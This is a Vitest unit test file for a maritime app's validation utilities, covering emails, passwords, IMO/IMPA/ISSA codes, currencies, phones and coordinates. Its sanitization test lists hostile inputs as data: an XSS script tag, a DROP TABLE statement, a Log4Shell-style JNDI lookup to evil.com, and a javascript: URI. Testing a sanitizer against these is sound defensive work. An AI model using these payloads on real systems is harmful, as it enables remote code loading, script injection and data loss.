import { describe, it, expect } from 'vitest';
import { 
  validateEmail, 
  validatePassword, 
  validateIMONumber, 
  validateIMPACode, 
  validateISSACode,
  validateCurrency,
  validatePhoneNumber,
  sanitizeInput,
  validateVesselPosition
} from '@/utils/validation';

describe('Validation Utils', () => {
  describe('Email Validation', () => {
    it('should validate correct email formats', () => {
      const validEmails = [
        'user@example.com',
        'test.email+tag@domain.co.uk',
        'user123@maritime-company.org',
        'captain@vessel.ship'
      ];

      validEmails.forEach(email => {
        expect(validateEmail(email)).toBe(true);
      });
    });

    it('should reject invalid email formats', () => {
      const invalidEmails = [
        'invalid-email',
        '@domain.com',
        'user@',
        'user..double.dot@domain.com',
        'user@domain',
        ''
      ];

      invalidEmails.forEach(email => {
        expect(validateEmail(email)).toBe(false);
      });
    });
  });

  describe('Password Validation', () => {
    it('should validate strong passwords', () => {
      const strongPasswords = [
        'StrongPass123!',
        'Maritime@2024',
        'Vessel#Security99',
        'Complex$Password1'
      ];

      strongPasswords.forEach(password => {
        expect(validatePassword(password)).toBe(true);
      });
    });

    it('should reject weak passwords', () => {
      const weakPasswords = [
        'weak',
        '12345678',
        'password',
        'PASSWORD',
        'Pass123', // too short
        'NoNumbers!',
        'nonumbers123',
        'NOLOWERCASE123!'
      ];

      weakPasswords.forEach(password => {
        expect(validatePassword(password)).toBe(false);
      });
    });
  });

  describe('Maritime Code Validation', () => {
    it('should validate IMO numbers', () => {
      const validIMO = [
        'IMO1234567',
        'IMO9876543',
        'IMO1111111'
      ];

      validIMO.forEach(imo => {
        expect(validateIMONumber(imo)).toBe(true);
      });
    });

    it('should reject invalid IMO numbers', () => {
      const invalidIMO = [
        'IMO123456', // too short
        'IMO12345678', // too long
        '1234567', // missing IMO prefix
        'IMOabcdefg', // non-numeric
        ''
      ];

      invalidIMO.forEach(imo => {
        expect(validateIMONumber(imo)).toBe(false);
      });
    });

    it('should validate IMPA codes', () => {
      const validIMPA = [
        '123456',
        '654321',
        '111111'
      ];

      validIMPA.forEach(code => {
        expect(validateIMPACode(code)).toBe(true);
      });
    });

    it('should validate ISSA codes', () => {
      const validISSA = [
        '12.34.56',
        '99.88.77',
        '11.22.33'
      ];

      validISSA.forEach(code => {
        expect(validateISSACode(code)).toBe(true);
      });
    });
  });

  describe('Currency Validation', () => {
    it('should validate ISO currency codes', () => {
      const validCurrencies = ['USD', 'EUR', 'GBP', 'JPY', 'SGD', 'NOK'];

      validCurrencies.forEach(currency => {
        expect(validateCurrency(currency)).toBe(true);
      });
    });

    it('should reject invalid currency codes', () => {
      const invalidCurrencies = ['US', 'EURO', 'POUND', 'XYZ', '123', ''];

      invalidCurrencies.forEach(currency => {
        expect(validateCurrency(currency)).toBe(false);
      });
    });
  });

  describe('Phone Number Validation', () => {
    it('should validate international phone numbers', () => {
      const validPhones = [
        '+1234567890',
        '+44 20 7946 0958',
        '+47 123 45 678',
        '+65-6123-4567'
      ];

      validPhones.forEach(phone => {
        expect(validatePhoneNumber(phone)).toBe(true);
      });
    });

    it('should reject invalid phone numbers', () => {
      const invalidPhones = [
        '123456', // too short
        'not-a-phone',
        '+', // just plus
        '++1234567890' // double plus
      ];

      invalidPhones.forEach(phone => {
        expect(validatePhoneNumber(phone)).toBe(false);
      });
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize dangerous input', () => {
      const dangerousInputs = [
        '<script>alert("xss")</script>',
        'DROP TABLE users;',
        '${jndi:ldap://evil.com/a}',
        'javascript:alert(1)'
      ];

      dangerousInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('${jndi:');
        expect(sanitized).not.toContain('javascript:');
      });
    });

    it('should preserve safe input', () => {
      const safeInputs = [
        'Normal text input',
        'Email: user@example.com',
        'Phone: +1-234-567-8900',
        'Maritime vessel MV Atlantic'
      ];

      safeInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).toBe(input);
      });
    });
  });

  describe('Vessel Position Validation', () => {
    it('should validate correct coordinates', () => {
      const validPositions = [
        { latitude: 0, longitude: 0 },
        { latitude: 90, longitude: 180 },
        { latitude: -90, longitude: -180 },
        { latitude: 51.5074, longitude: -0.1278 }, // London
        { latitude: 1.3521, longitude: 103.8198 } // Singapore
      ];

      validPositions.forEach(pos => {
        expect(validateVesselPosition(pos.latitude, pos.longitude)).toBe(true);
      });
    });

    it('should reject invalid coordinates', () => {
      const invalidPositions = [
        { latitude: 91, longitude: 0 }, // latitude too high
        { latitude: -91, longitude: 0 }, // latitude too low
        { latitude: 0, longitude: 181 }, // longitude too high
        { latitude: 0, longitude: -181 }, // longitude too low
        { latitude: NaN, longitude: 0 },
        { latitude: 0, longitude: NaN }
      ];

      invalidPositions.forEach(pos => {
        expect(validateVesselPosition(pos.latitude, pos.longitude)).toBe(false);
      });
    });
  });
});